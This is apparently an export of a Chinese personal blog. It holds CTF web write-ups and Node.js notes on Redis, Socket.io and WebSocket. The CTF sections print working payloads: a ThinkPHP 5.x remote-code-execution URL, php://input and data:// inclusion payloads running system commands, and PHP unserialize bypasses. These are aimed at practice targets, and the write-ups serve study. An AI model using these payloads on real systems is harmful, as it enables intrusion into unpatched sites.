|| !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 进入hint.php，告诉我们flag在ffffllllaaaagggg中 审计代码，发现需要让其访问到flag的所在文件，我们需要构造这样的payload: 1?file=(source.php or hint.php)(url二次编码的&apos;?&apos; =&gt; %253F)(flag文件的位置) url二次编码：在接收请求时，会自动进行一次url解码，php代码中又内置了一行手动解码，因此通过需要二次编码。 关于flag文件的位置：私认为题出的不好，flag文件于../../../../../ffffllllaaaagggg，且只提示了文件名，没有路径，需要自己暴力../去找。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-02","date":"2020-10-01T13:30:00.000Z","path":"2020/10/01/ctf/ctf笔记-02/","text":"Web_php_unserialize(题外话)这一题觉得好难呀 访问端口: output: 123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = 'index.php'; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != 'index.php') &#123; //the secret is in the fl4g.php $this-&gt;file = 'index.php'; &#125; &#125; &#125;if (isset($_GET['var'])) &#123; $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) &#123; die('stop hacking!'); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(\"index.php\"); &#125; ?&gt; var 我们需要get传参var，var的值就是序列化后的类的base64编码 在处理var时用到了正则匹配检测，含义就是匹配 o或c之后跟数字加冒号的格式 Demo 看到了三个方法，构造器不用管，从注释看到了目标文件fl4g.php __destruct会将输入的文件输出 \\wakeup则是一个防护用函数，将file强制改为index.php，因此我们需要绕过__wakeup方法 序列化123O:4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过正则 O:+4:\"Demo\":1:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125;=&gt;绕过__wakeup() O:+4:\"Demo\":2:&#123;s:10:\"Demofile\";s:8:\"fl4g.php\";&#125; base64加密123456789101112131415161718192021&lt;?phpclass Demo &#123; private $file = &apos;index.php&apos;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &apos;index.php&apos;) &#123; //the secret is in the fl4g.php $this-&gt;file = &apos;index.php&apos;; &#125; &#125; &#125;$b = new Demo(&apos;fl4g.php&apos;);$c = serialize($b);$c = str_replace(&quot;O:4&quot;, &quot;O:+4&quot;, $c);$c = str_replace(&quot;:1:&#123;&quot;, &quot;:2:&#123;&quot;, $c);echo base64_encode($c); output 1TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== url 1http://220.249.52.133:36436/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 反思踩坑=&gt;base64我们如果使用网页上的base64加密工具，则会出现忽略空格的问题: 12base64加密工具：TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=php自行加密：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 在使用base64加密时，一定要构造原生php，切记使用加密工具! php_rcerce访问端口，得到了tp的默认首页 这里需要使用tp的 5.0-5.0.24 版本和 5.1.0-5.1.30 版本的rce漏洞进行攻击 攻击方法 =&gt; 这篇博客写的有点问题，我们需要将thinkapp换为think\\app url1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot; 在输出发现/flag文件，访问它 1http://220.249.52.133:58615/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 得到了flag Web_php_include访问端口，得到了php代码： 123456789&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, \"php://\")) &#123; $page=str_replace(\"php://\", \"\", $page);&#125;include($page);?&gt; 这题解法很多样的样子，看看wp能得到很多操作 大小写绕过php://这里php://不分大小写，代码中只做了小写判定，所以我们可以大小写绕过 burp拦截头信息 – proxy – interccept =&gt;(获取到头信息后) Actions – send to repeater 123456789GET / HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 修改头信息123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 22&lt;?php system(&quot;ls&quot;); ?&gt; output 123fl4gisisish3r3.phpindex.phpphpinfo.php 访问fl4gisisish3r3.php： 123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 42&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 得到了flag 使用其他协议data://修改头信息(拦截见上)12http://220.249.52.133:40787/?page=data://text/plain;base64,%0CPD9waHAgc3lzdGVtKCdscycpOyA/Pg== # &lt;?php system(&quot;ls&quot;); ?&gt; 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8+# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 这时候出问题了 url中的特殊符号我们需对url中的特殊符号(+, (空格), )进行url编码来传数据 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8%2b# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 在html注释get到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-01","date":"2020-10-01T13:25:00.000Z","path":"2020/10/01/ctf/ctf笔记-01/","text":"写在前面： 此笔记系个人(初学者)整理思路之用，没有想过能起到供各位参考学习的用处。 尽可能按照攻防世界的题目顺序来。 如果各位从我的文章发现了什么问题或者想和我探tan讨tan探ren讨sheng，欢迎联系我呀~ baby_web​ 进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch dirsearch1python dirsearch.py -u http://220.249.52.133:40885 -e* output: 12345678910111213[19:22:07] 403 - 306B - /.htaccess.bak1[19:22:07] 403 - 306B - /.htaccess.orig[19:22:07] 403 - 308B - /.htaccess.sample[19:22:07] 403 - 306B - /.htaccess.save[19:22:07] 403 - 304B - /.htaccessBAK[19:22:07] 403 - 304B - /.htaccessOLD[19:22:07] 403 - 305B - /.htaccessOLD2[19:22:07] 403 - 303B - /.httr-oauth[19:22:15] 200 - 11B - /1.php[19:23:08] 302 - 17B - /index.php -&gt; 1.php[19:23:08] 302 - 17B - /index.php/login/ -&gt; 1.php[19:23:30] 403 - 305B - /server-status[19:23:30] 403 - 306B - / 发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题 Training-WWW-Robots​ 看题目知道，是关于robots.txt的,因此我们可以直接访问robots.txt路由/robots.txt robots.txt​ output: 123456User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: * 看到了类似于flag的路由，过去直接发现路由 unserialize3​ 根据题目来看，这题是关于反序列化的 ​ 访问地址： 123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= ​ 发现这php语法错误，少一括号看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag ​ 我们把这个类序列化： 12345678910&lt;?phpclass xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests'); &#125;&#125;$b = new xctf();$c = serialize($b);echo $c; output 1O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125; 我们直接写入code参数中: 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; output 1bad requests 这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。 如何绕过php反序列化的__wakeup()方法呢？ 在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法 例如，O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;},我们若改成：O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法 重新路由： 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; 拿到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"12.Redis","date":"2020-09-29T11:21:24.000Z","path":"2020/09/29/nodeJs/12. redis/","text":"Redis1. 介绍(抄自菜鸟教程) REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 特点 基于内存，可持久化 &gt; 快速 可存键值对，数据结构 &gt; 算法透明(开源) 具有多语言支持 2. 数据类型 - 控制台使用演示 更多指令见菜鸟教程 string12345set key valueget keydel key 一个键最大能存储 512MB。 hash1234567hset obj key value //redis[&quot;obj&quot;].key = valuehmset obj key1 value1 [key2 value2 ...]hget obj keyhmget obj key1 [key2] 每个 hash 可以存储 232 -1 键值对（40多亿） list123l(r)push listName value1 [value2 ...]l(r)pop listName 列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿) set 无序集合 123sadd setName value1 [value2 ...]smembers runoob 集合中最大的成员数为 2^32 - 1 (4294967295, 每个集合可存储40多亿个成员) zset 有序集合 skiplist 通俗易懂 ziplist顺序数据结构，适用数据集较小时 123zadd zsetName score(double) value1 [value2 ...]zrangebyscore zsetName min max //[min, max] HyperLogLog 基数计数 Btree(各位大佬们都学过了) bitmap 比较：Btree对于合并操作的时间复杂度不如bitmap，但是bitmap的空间复杂度为$O(max{a_{n}})$ 12345pfadd hllName value [value ...]pfcount hllName [hllName ...]pfmerge destkey sourcekey [sourcekey ...] redis 持久化 将内存存入硬盘的策略 RDB以snapshot形式，每隔特定时间间隔将数据集快照写入磁盘 save触发(abandoned) ​ 执行save期间，阻塞redis bgsave触发 ​ 非阻塞，fork出程序 配置触发条件 ​ 由系统决定 save ​ save m n m秒内数据集存在n次修改时，自动触发bgsave ​ 启用RDB后默认启用 默认配置: save 900 1 &amp;&amp; save 300 10 &amp;&amp; save 60 10000 (并发执行) stop-weites-on-bgsave-error ​ 启用RDB后默认启用，当后台保存数据失败时， rdbcompression ​ 启用RDB后默认启用，压缩存储快照LZF rdbchecksum ​ 启用RDB后默认启用，存取快照后使用CRC64进行数据校验 dbfilename ​ 设置快照的文件名 dir ​ 快照的存放路径 (照抄网上) ①、优势 （1）RDB文件紧凑，全量备份，非常适合用于进行备份和灾难恢复。 （2）生成RDB文件的时候，redis主进程会fork()一个子进程来处理所有保存工作，主进程不需要进行任何磁盘IO操作。 （3）RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 ②、劣势 RDB快照是一次全量备份，存储的是内存数据的二进制序列化形式，存储上非常紧凑。当进行快照持久化时，会开启一个子进程专门负责快照持久化，子进程会拥有父进程的内存数据，父进程修改内存子进程不会反应出来，所以在快照持久化期间修改的数据不会被保存，可能丢失数据。 AOF以log形式，将一个个的命令记录入文件 always ​ 同步日志 everysec ​ 每秒记录(同一秒内宕机，一秒间的数据丢失) no ​ 不可控，从不同步(依赖os的写入) (照抄) 1、优点 （1）AOF可以更好的保护数据不丢失，一般AOF会每隔1秒，通过一个后台线程执行一次fsync操作，最多丢失1秒钟的数据。（2）AOF日志文件没有任何磁盘寻址的开销，写入性能非常高，文件不容易破损。 （3）AOF日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。 （4）AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用flushall命令清空了所有数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令给删了，然后再将该AOF文件放回去，就可以通过恢复机制，自动恢复所有数据 2、缺点 （1）对于同一份数据来说，AOF日志文件通常比RDB数据快照文件更大 （2）AOF开启后，支持的写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，当然，每秒一次fsync，性能也还是很高的 （3）以前AOF发生过bug，就是通过AOF记录的日志，进行数据恢复的时候，没有恢复一模一样的数据出来。 文件重写 防止文件过大，使用bgreweiteaof，将内存中的数据以命令方式保存到临时文件，同时fork出一条新进程将文件重写 可以减小log的体积(减少不必要的命令，压缩可以压缩的命令) laravel配置 php的redis扩展 使用1redis::somecommand //redis的命令","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"11.Socket.io","date":"2020-09-29T11:16:24.000Z","path":"2020/09/29/nodeJs/11. socket.io/","text":"Socket.io 提供了很好的灵活性，并非完全基于WebSocket =&gt; 可以在大多数设备上运行 聊天程序初始化程序123456789&#123; \"name\": \"chat.io\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"body-parser\": \"^1.19.0\", \"express\": \"^4.17.1\", \"socket.io\": \"^2.3.0\" &#125;&#125; 构建服务器123456789101112131415161718/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123;extended: true&#125;));app.listen(3000); 将Socket.io绑定到服务器上 12345var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected');&#125;) 构建客户端public/index.html 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"message\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; public/chat.js 12345window.onload = function() &#123; //本例中，因为没有传递参数给io.connect，所以，它会尝试向页面所在的主机发起连接 //socket.io会使用适合当前浏览器的最优选择进行socket连接 var socket = io.connect();&#125; 事件与广播广播中加入用户信息public/chat.css 1234#chat &#123; /*将聊天窗口隐藏，登录后显示*/ display: none;&#125; public/chat.js 123456socket.on('connect', function () &#123; //通过join事件发送昵称 socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block';&#125;) server.js 12345678io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;);&#125;); 广播聊天信息public/chat.js 12345678910111213141516171819202122232425262728293031323334353637383940window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; //通知其他用户信息的事件 socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); //添加消息(li)元素 function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; //添加用户自身的信息 addMessage('me', input.value); socket.emit('text', input.value); input.value = ''; input.focus(); return false; &#125; //addMessage是 text-接收 事件的响应回调函数 socket.on('text', addMessage);&#125; server.js 123456789101112131415161718192021222324252627282930313233343536/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给除了自己以外所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg) &#123; //第一个参数是事件名，后面的参数都是给回调函数的 socket.broadcast.emit('text', socket.nickname, msg); &#125;);&#125;);httpServer.listen(3000); 改进用户体验，增加反馈server.js 12345678910111213141516171819202122232425262728293031323334353637/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); //确认事件已接收 fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); public/char.js 123456789101112131415161718192021222324252627282930313233343536373839404142window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage);&#125; 轮流做DJ - 聊天程序扩展需求 服务器初始选择一名DJ DJ有权利请求 查询API，获取查询结果，选择一首歌，然后将这首歌广播给所有其他听众 当DJ离开时，系统会开放DJ人选 给下一名用户 扩展聊天应用server,js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect (socket) &#123; dj = socket; //向所有人发出通知 -- 注意区别 io.sockets.emit('announcement', socket.nickName + ' is the new dj'); //向单个用户发出通知 -- 注意区别 socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //向除了这个用户以外的其他人发送通知 -- 注意区别 socket.broadcast.emit('announcement', name + ' joined the chat.'); if(!dj) &#123; //如果没有dj就选择一名dj elect(socket); &#125; else &#123; //如果dj正在搓碟就向这个用户发送目前的歌名 socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); puiblic/index.html 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"playing\"&gt;&lt;/div&gt; &lt;form id=\"dj\"&gt; &lt;h3&gt;Search songs&lt;/h3&gt; &lt;input type=\"text\" id=\"s\" /&gt; &lt;ul id=\"results\"&gt;&lt;/ul&gt; &lt;button type=submit&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"messages\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 集成Grooveshark API(由于不能翻墙，所以不能测试代码的正确性) 添加superagent 1npm install superagent server.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http'), request = require('superagent');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;var apiKey = '&#123;your API key&#125;';/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect(socket) &#123; dj = socket; io.sockets.emit('announcement', socket.nickName + ' is the new dj'); socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function (name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); if (!dj) &#123; elect(socket); &#125; else &#123; socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;); //搜索的功能(事件分发) socket.on('search', function (q, fn) &#123; request('http://tinysong.com/s/' + encodeURIComponent(q) + '?key=' + apiKey + '&amp;format=json', function (res) &#123; if (200 == res.status) fn(JSON.parse(res.text)); &#125;); &#125;); //通知其他人正在播放的歌曲 socket.on('song', function () &#123; if (socket.dj) &#123; currentSong = song; socket.broadcast.emit('song', song); &#125; &#125;);&#125;);httpServer.listen(3000); public/chat.css 1234567#results a &#123; display: none;&#125;form.isDJ #results a &#123; display: none;&#125; public/chat.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage(from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage); //search form var form = document.getElementById('dj'); var results = document.getElementById('results'); form.style.display = 'block'; form.onsubmit = function () &#123; results.innerHTML = ''; socket.emit('search', document.getElementById('s').value, function (songs) &#123; for (var i = 0, l = songs.length; i &lt; l; i++) &#123; (function (song) &#123; var result = document.createElement('li'); result.innerHTML = song.ArtistName + ' - &lt;b&gt;' + song.SongName + '&lt;/b&gt; '; var a = document.createElement('a'); a.href = '#'; a.innerHTML = 'Select'; a.onclick = function () &#123; socket.emit('song', song); play(song); return false; &#125;; result.appendChild(a); results.appendChild(result); &#125;)(song[i]); &#125; &#125;); return false; &#125;; socket.on('elected', function () &#123; form.className = 'isDJ'; &#125;); var playing = document.getElementById('playing'); function play(song) &#123; if(!song) return; playing.innerHTML = '&lt;hr&gt;&lt;b&gt;Now Playing: &lt;/b&gt; ' + song.ArtistName + ' ' + song.SongName + '&lt;br&gt;'; var iframe = document.createElement('iframe'); iframe.frameborder = 0; iframe.src = song.Url; playing.appendChild(iframe); &#125;&#125;","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"10.WebSocket","date":"2020-09-29T11:15:24.000Z","path":"2020/09/29/nodeJs/10. WebSocket/","text":"WebSocket注解：书中使用的WebSocket.io已经是8年未动的过时项目了，因此这里的所有内容使用的均为ws 使用ws模块 客户端 12345678910//WebSocket实例化var ws = new WebSocket(\"ws://localhost:8181\");ws.onopen = function (e) &#123; //成功连接服务器回调 console.log('客户端（client）：与服务器的连接已打开')&#125;function sendMessage() &#123; ws.send($('#message').val());&#125;; 服务端 12345678var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123;port: 8181&#125;);wss.on('connection', function (ws) &#123; console.log('服务器端：客户端已连接'); ws.on('message', function(message) &#123; console.log(message); &#125;);&#125;); 一个ECHO实例初始化项目package.json 12345678910&#123; \"name\": \"ws-echo\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"bufferutil\": \"^4.0.1\", \"express\": \"*\", \"utf-8-validate\": \"^5.0.2\", \"ws\": \"*\" &#125;&#125; 服务端这里的ws服务器与express服务器是两个端口，其之间是分离的 123456789101112131415161718192021222324252627282930var express = require('express');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; port: 